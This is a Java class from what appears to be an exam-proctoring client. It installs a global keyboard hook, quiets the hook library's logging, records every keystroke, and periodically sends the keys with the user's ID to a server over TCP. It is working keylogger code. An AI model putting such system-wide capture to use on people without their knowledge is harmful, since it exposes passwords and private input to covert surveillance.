package com.client.liveowl.socket;

import com.client.liveowl.util.Authentication;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import static com.client.liveowl.AppConfig.*;

public class StudentTaskTcp {

    private static final StringBuilder keyLogBuffer = new StringBuilder();
    public static void start()
    {
        try
        {
            // Tắt logging mặc định của GlobalScreen
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            logger.setUseParentHandlers(false);
            GlobalScreen.registerNativeHook();

            // Thêm listener bàn phím
            GlobalScreen.addNativeKeyListener(new NativeKeyListener()
            {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e)
                {
                    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
                    synchronized (keyLogBuffer)
                    {
                        keyLogBuffer.append(keyText).append(" ");
                    }
                }
            });

            // Lập lịch gửi dữ liệu định kỳ
            Timer timer = new Timer();
            timer.schedule(new TimerTask() {
                @Override
                public void run()
                {
                    sendKeyData();
                }
            }, 0, SEND_INTERVAL);
        }
        catch (Exception e)
        {
            throw new RuntimeException(e);
        }
    }

    private static void sendKeyData()
    {
        String dataToSend;
        synchronized (keyLogBuffer)
        {
            if (keyLogBuffer.length() == 0)
            {
                return;
            }
            dataToSend = keyLogBuffer.toString();
            keyLogBuffer.setLength(0);
        }
        try (Socket socket = new Socket(SERVER_HOST_NAME, StudentSocket.newServerPortLogger);
             PrintWriter writer = new PrintWriter(socket.getOutputStream(), true))
        {
            System.out.println(Authentication.getUserId());
            writer.println(Authentication.getUserId());
            writer.println(dataToSend);
            System.out.println("Dữ liệu đã được gửi: " + dataToSend);
        } catch (IOException e)
        {
            System.out.println("Lỗi kết nối. Dữ liệu sẽ được gửi lại lần sau.");
            synchronized (keyLogBuffer)
            {
                keyLogBuffer.insert(0, dataToSend); // Thêm lại dữ liệu vào bộ đệm nếu gửi thất bại
            }
        }
    }
}